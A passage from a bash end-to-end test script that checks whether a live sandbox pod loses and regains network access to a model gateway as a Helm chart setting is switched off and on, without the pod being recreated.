  sbx_uid_before=$(sbx_uid)
  sbx_pod_before=$(sandbox_pod_name)
  contains "an awake sandbox pod is running before the upgrade" '^[0-9a-f-]{36}$' "$sbx_uid_before"
  if until_ok 90 sbx_reaches "$mg_url"; then ok "before: the awake sandbox reaches the model gateway (control)"
  else fail "before: the awake sandbox reaches the model gateway (control)"; fi

  # Withdraw the model gateway: the live sandbox must lose it once the reconcile applies the policy.
  before_pods=$(server_pods)
  if out=$(upgrade_gateway_access false); then ok "chart upgraded with sandbox.modelGatewayAccess=false"
  else fail "chart upgraded with sandbox.modelGatewayAccess=false: $out"; fi
  contains "the reconcile of the upgraded server changed the team policy (gateway withdrawn)" '"policyChanged":[1-9]' \
    "$(wait_for 120 '"policyChanged":[1-9]' changed_summary "$before_pods")"
  contains "control: the awake sandbox still reaches the server's sandbox port" '^yes$' \
    "$(if until_ok 90 sbx_reaches "$server_url"; then echo yes; else echo no; fi)"
  if until_ok 90 sbx_cannot_reach "$mg_url"; then ok "the awake sandbox can no longer reach the model gateway"
  else fail "the awake sandbox can no longer reach the model gateway"; fi

  # Allow it again: the newly allowed service, reached by the same sandbox pod, no wake, no recreate.
  before_pods=$(server_pods)
  if out=$(upgrade_gateway_access true); then ok "chart upgraded with sandbox.modelGatewayAccess=true"
  else fail "chart upgraded with sandbox.modelGatewayAccess=true: $out"; fi
  contains "the reconcile of the upgraded server changed the team policy (gateway allowed)" '"policyChanged":[1-9]' \
    "$(wait_for 120 '"policyChanged":[1-9]' changed_summary "$before_pods")"
  if until_ok 90 sbx_reaches "$mg_url"; then ok "after the reconcile the awake sandbox reaches the newly allowed model gateway"
  else fail "after the reconcile the awake sandbox reaches the newly allowed model gateway"; fi
  contains "it is the same sandbox pod (not woken or recreated)" "^${sbx_pod_before}\\|${sbx_uid_before}\$" \
    "$(sandbox_pod_name)|$(sbx_uid)"
elif [[ "${CI:-}" == "true" ]]; then
  fail "the upgrade-reaches-sandbox check needs KOBE_SANDBOX_IMAGE and the e2e sandbox"
else
  echo "SKIP upgrade-reaches-sandbox check (KOBE_SANDBOX_IMAGE not set)"
fi

exit "$failed"
